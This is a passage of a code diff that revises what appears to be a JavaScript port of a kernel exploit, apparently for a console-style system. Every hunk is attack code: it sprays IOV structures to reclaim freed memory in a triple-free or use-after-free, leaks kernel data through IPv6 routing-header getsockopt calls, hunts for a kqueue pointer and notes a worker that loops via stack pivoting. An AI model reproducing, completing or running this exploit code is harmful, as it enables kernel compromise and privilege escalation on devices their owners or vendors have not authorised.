   getsockopt(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
-  var first_int = mem.view(leak_rthdr_buf).getUint32(0, true)
-  if (first_int === 1) {
-    log('IOV reclaim successful after ' + triplet_spray_attempts + ' sprays (first_int = 1)')
+  if (mem.view(leak_rthdr_buf).getUint32(0, true) === 1) {
+    log('IOV reclaim successful (first_int = 1) after ' + (UAF_TRIES - uaf_timeout) + ' attempts')
     break
   }
 
-  if (triplet_spray_attempts % 100 === 0) {
-    log('Triple-free spray attempt ' + triplet_spray_attempts + '...')
-  }
+  // Complete IOV spray (matching Java: write → waitForFinished → read)
+  write_sys(new BigInt(iov_ss1), workers[0].signal_buf, new BigInt(0, 1))
+  read_sys(new BigInt(workers[0].ctrl_sock0), workers[0].signal_buf, new BigInt(0, 1))
+  read_sys(new BigInt(iov_ss0), workers[0].signal_buf, new BigInt(0, 1))
+  // Worker auto-loops via stack pivoting - no respawn needed
 }
 
-if (triplet_spray_attempts >= max_triplet_spray) {
-  throw new Error('Failed to reclaim with IOV spray for triple-free')
+if (uaf_timeout <= 0) {
+  throw new Error('IOV reclaim failed after ' + UAF_TRIES + ' attempts')
 }
 
 var triplets = [-1, -1, -1]
@@ -577,7 +715,7 @@ function findTriplet (master, other) {
         continue
       }
 
-      mem.view(leak_len_buf).setBigInt(0, new BigInt(0, UCRED_SIZE), true)
+      mem.view(leak_len_buf).setUint32(0, UCRED_SIZE, true)
       getsockopt(ipv6_sockets[master], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
       var val = mem.view(leak_rthdr_buf).getUint32(4, true)
@@ -637,7 +775,7 @@ for (var attempt = 0; attempt < max_attempts; attempt++) {
   kq_fd = kqueue_sys()
 
   // Leak with triplets[0]
-  mem.view(leak_len_buf).setBigInt(0, new BigInt(0, 0x100), true)
+  mem.view(leak_len_buf).setUint32(0, 0x100, true)
   getsockopt(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr_buf, leak_len_buf)
 
   // Check for kqueue signature at offset 0x08
@@ -654,7 +792,7 @@ for (var attempt = 0; attempt < max_attempts; attempt++) {
   close_sys(kq_fd)
 }
 
-if (kq_fdp.lo() === 0 && kq_fdp.hi() === 0) {
+if (kq_fdp.lo === 0 && kq_fdp.hi === 0) {
   throw new Error('Failed to leak kqueue after ' + max_attempts + ' attempts')
 }
 
